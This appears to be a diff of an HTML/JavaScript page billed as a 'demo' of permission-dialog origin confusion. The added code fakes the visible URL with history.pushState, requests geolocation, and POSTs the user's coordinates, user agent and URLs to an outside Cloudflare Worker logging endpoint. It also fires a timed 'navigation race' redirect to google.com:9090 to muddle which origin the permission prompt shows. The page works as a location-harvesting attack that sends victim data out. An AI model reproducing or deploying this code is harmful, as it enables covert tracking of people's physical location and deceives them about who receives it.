@@ -50,13 +50,8 @@ button {
   <h2>Request Location</h2>
   <p>Tap the button below to request Geolocation permission.</p>
 
-  <button id="getLocationBtn">Get Location</button>
+  <button onclick="getLocation()">Get Location</button>
   <p id="output">Location: -</p>
-
-  <div id="locationLink" style="display:none;">
-    <p>Click the link below to see the location on Google Maps:</p>
-    <a id="mapLink" target="_blank">View on Google Maps</a>
-  </div>
 
   <div class="notice">
     Demo only — observe origin shown in permission dialog
@@ -64,83 +59,88 @@ button {
 </div>
 
 <script>
-const panel = document.getElementById('panel');
+const panel   = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
-const getLocationBtn = document.getElementById('getLocationBtn');
-const output = document.getElementById('output');
-const locationLink = document.getElementById('locationLink');
-const mapLink = document.getElementById('mapLink');
+const output  = document.getElementById('output');
 
-/* ✅ Cloudflare Worker endpoint */
-const webhookUrl = 'https://geo-log-production.ecdnts.workers.dev/';
+/* 🔗 Cloudflare Worker endpoint */
+const webhookUrl = 'https://geo-log.ecdnts.workers.dev';
 
-/* 🔎 capture what the user SEES before permission */
+/* 🔎 what user sees BEFORE permission */
 let visibleContext = {
-  origin_before: location.origin,
-  href_before: location.href,
-  ts_before: new Date().toISOString()
+  origin: location.origin,
+  href: location.href,
+  time: new Date().toISOString()
 };
 
-trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
-
-  visibleContext = {
-    origin_before: location.origin,
-    href_before: location.href,
-    ts_before: new Date().toISOString()
-  };
-};
-
-getLocationBtn.onclick = () => {
-  if (!navigator.geolocation) {
-    output.textContent = 'Geolocation not supported.';
-    return;
-  }
+function getLocation() {
+  if (!navigator.geolocation) return;
 
   navigator.geolocation.getCurrentPosition(
     pos => {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
 
-      output.textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+      output.textContent = `${lat}, ${lon}`;
 
-      const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
-      mapLink.href = googleMapsUrl;
-      mapLink.textContent = `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
-      locationLink.style.display = 'block';
-
-      // ✅ send log to Cloudflare Worker
+      /* ✅ SEND LOG FROM GITHUB → CLOUDFLARE */
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          event: 'geolocation_allowed',
+          event: "geo_permission_allowed",
           latitude: lat,
           longitude: lon,
-          visible_origin: visibleContext.origin_before,
-          visible_url: visibleContext.href_before,
-          visible_timestamp: visibleContext.ts_before,
+
+          /* what user saw */
+          visible_origin: visibleContext.origin,
+          visible_url: visibleContext.href,
+          visible_time: visibleContext.time,
+
+          /* actual page state */
           actual_origin: location.origin,
           actual_url: location.href,
-          permission_time: new Date().toISOString(),
-          userAgent: navigator.userAgent
+
+          userAgent: navigator.userAgent,
+          permission_time: new Date().toISOString()
         })
-      }).finally(() => {
-        // redirect after sending log
-        setTimeout(() => {
-          location.href = 'https://google.com:9090';
-        }, 100); // delay singkat supaya fetch sempat jalan
-      });
+      }).catch(()=>{});
     },
-    err => {
-      output.textContent = 'Permission denied or error.';
-      console.error(err);
+    () => {
+      output.textContent = 'Permission denied';
     }
   );
+}
+
+/*
+ * Step 1:
+ * Manipulate visible URL
+ */
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+
+  visibleContext = {
+    origin: location.origin,
+    href: location.href,
+    time: new Date().toISOString()
+  };
 };
+
+/*
+ * Step 2:
+ * Navigation race
+ */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
+});
 </script>
 
 </body>
 </html>
-
